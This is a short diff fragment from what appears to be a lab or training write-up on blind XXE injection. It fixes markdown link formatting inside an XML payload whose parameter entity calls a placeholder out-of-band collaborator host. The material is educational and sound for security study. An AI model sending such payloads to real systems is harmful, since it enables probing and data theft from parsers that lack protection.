@@ -16,7 +16,7 @@ The application's XML parser is configured to block standard external entities. 
    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE stockCheck [
-     <!ENTITY % xxe SYSTEM "[http://YOUR-COLLABORATOR-ID.oastify.com](http://YOUR-COLLABORATOR-ID.oastify.com)"> 
+     <!ENTITY % xxe SYSTEM "[http://YOUR-COLLABORATOR-ID.oastify.com]"> 
      %xxe;
    ]>
    <stockCheck>
